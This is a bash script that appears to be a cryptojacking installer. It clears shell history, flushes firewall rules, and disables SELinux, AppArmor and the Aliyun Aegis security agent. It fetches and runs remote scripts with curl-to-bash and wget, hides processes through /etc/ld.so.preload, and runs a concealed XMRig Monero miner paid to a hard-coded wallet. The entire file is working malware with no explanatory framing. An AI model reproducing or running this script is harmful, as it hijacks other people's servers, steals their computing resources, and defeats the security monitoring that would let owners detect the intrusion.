#!/bin/bash

history -c
iptables -F
rm -rf /etc/ld.so.preload
sysctl kernel.nmi_watchdog=0
echo '0' >/proc/sys/kernel/nmi_watchdog
echo 'kernel.nmi_watchdog=0' >>/etc/sysctl.conf

if [[ -f /usr/bin/wget && -f /usr/bin/curl ]] ; then
    echo "curl/wget exists" ;
elif [[ ! -f /usr/bin/wget || ! -f /usr/bin/curl ]]; then
    apt-get install wget curl -y ;
else 
    apt-get update -y && apt-get upgrade -y ;
    apt-get install wget curl -y ;
fi

# disable security and clear others
curl github.com/username/Crpt-Shad0w/clean.sh | bash
setenforce 0
echo SELINUX=disabled >/etc/selinux/config
service apparmor stop
systemctl disable apparmor
service aliyun.service stop
systemctl disable aliyun.service
ps aux | grep -v grep | grep 'aegis' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'Yun' | awk '{print $2}' | xargs -I % kill -9 %
rm -rf /usr/local/aegis

mkdir /usr/local/games/.mconfd ;
DIR=/usr/local/games/.mconfd ;
wallet="49qQh9VMzdJTP1XA2yPDSx1QbYkDFupydE5AJAA3jQKTh3xUYVyutg28k2PtZGx8z3P2SS7VWKMQUb9Q4WjZ3jdmHPjoJRo";
client=$(curl --silent ifconfig.me);
cpus=$(lscpu -p | grep -c "^[0-9]");
threads=$(( $cpus / 2));


function hide() {
    cd $DIR ;
    wget https://github.com/m4rtis01/zarwel/raw/main/libprhid.so 1>/dev/null ;
    chmod +x libprhid.so
	mv libprhid.so /usr/local/lib/;
    echo /usr/local/lib/libprhid.so >> /etc/ld.so.preload ;
    
    if [[ -f /usr/local/lib/libprhid.so && -f /etc/ld.so.preload ]] ;
        then printf "%-20s %20s\n" " hidesetup" "[  DONE  ]" ;
    else printf "%-20s %20s\n" " hidesetup" "[  FAILED  ]" ;
    fi
}

function miner() {
    cd $DIR ;
    wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz 1>/dev/null ;
    tar -xvf xmrig-6.20.0-linux-static-x64.tar.gz 1>/dev/null ;
    mv xmrig-6.20.0/xmrig xmrig-6.20.0/rig ;
    mv xmrig-6.20.0/rig . ;
    rm -rf xmrig-6.20.0/ ;
    rm -rf xmrig-6.20.0-linux-static-x64.tar.gz ;
    nohup ./rig --url pool.hashvault.pro:80 --user $wallet --pass $client -t $threads --donate-level=0 --tls --tls-fingerprint=420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 & disown -h %1
}

function killer() {
    cd $DIR ;
    wget https://raw.githubusercontent.com/m4rtis01/zarwel/main/kl.sh 1>/dev/null ;
    chmod +x kl.sh ;
    nohup ./kl.sh & disown -h %1
}

if [[ $1 == "hide" ]] ;
    then hide ;
elif [[ $1 == "miner" ]] ;
    then miner ;
elif [[ $1 == "killer" ]] ;
    then killer ;
elif [[ $1 == "all" ]] ;
    then hide ; miner ; killer ;
fi